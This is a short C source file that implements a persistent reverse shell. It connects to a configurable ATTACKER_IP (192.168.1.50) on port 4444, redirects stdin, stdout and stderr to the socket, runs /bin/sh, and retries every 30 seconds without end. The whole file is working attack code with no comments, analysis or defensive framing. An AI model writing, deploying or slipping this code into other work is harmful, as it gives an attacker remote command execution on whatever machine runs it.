#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#ifndef ATTACKER_IP
#define ATTACKER_IP "192.168.1.50"
#endif
#ifndef ATTACKER_PORT
#define ATTACKER_PORT 4444
#endif
#ifndef RETRY_DELAY
#define RETRY_DELAY 30
#endif

int main(void) {
    struct sockaddr_in revsockaddr = {
        .sin_family = AF_INET,
        .sin_port   = htons(ATTACKER_PORT),
        .sin_addr.s_addr = inet_addr(ATTACKER_IP),
    };

    while (1) {
        int sockt = socket(AF_INET, SOCK_STREAM, 0);
        if (sockt < 0) { sleep(RETRY_DELAY); continue; }

        if (connect(sockt, (struct sockaddr *)&revsockaddr, sizeof(revsockaddr)) < 0) {
            close(sockt);
            sleep(RETRY_DELAY);
            continue;
        }

        dup2(sockt, 0);
        dup2(sockt, 1);
        dup2(sockt, 2);
        close(sockt);

        char *argv[] = { "/bin/sh", NULL };
        execve("/bin/sh", argv, NULL);

        sleep(RETRY_DELAY);
    }
}
